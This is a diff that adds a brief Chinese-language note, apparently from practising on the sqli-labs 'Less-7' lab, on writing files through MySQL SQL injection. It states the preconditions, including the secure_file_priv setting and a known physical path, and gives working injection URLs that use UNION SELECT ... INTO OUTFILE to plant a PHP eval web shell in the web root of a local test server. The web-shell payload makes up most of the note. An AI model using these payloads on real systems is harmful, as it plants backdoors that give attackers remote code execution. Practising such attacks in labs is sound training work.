@@ -1,0 +1,12 @@
+前提条件：Mysql用户拥有对应执行函数的操作，知道物理路径，secure_file_priv 值配置
+secure_file_priv 的问题：https://blog.csdn.net/qq_31518899/article/details/75662090
+如果secure_file_priv设置的值与你得到的物理路径不相同，一样不能写入文件。除非secure_file_priv的配置是secure_file_priv=''或你得到的物理路径与secure_file_priv配置的路径一样
+
+写入命令：
+http://127.0.0.1/sql/Less-7/?id=0')) union select 1,"<?php @eval($_GET['h']);?>",3 into outfile "J:/phpStudy/PHPTutorial/WWW/xx.php" --+
+into outfile：向指定文件写入如果文件不存在则创建文件
+
+注意：写入文件的内容里面不能用""
+例子：
+http://127.0.0.1/sql/Less-7/?id=0')) union select 1,"<?php @eval($_GET['h']);?>",3 into outfile "J:/phpStudy/PHPTutorial/WWW/xx.php" --+ 
+http://127.0.0.1/sql/Less-7/?id=0%27)) union select 1,"<?php @eval($_GET["a"]);?>",3 into outfile "J:/phpStudy/PHPTutorial/WWW/cfc.php" --+ /*错误语句*/
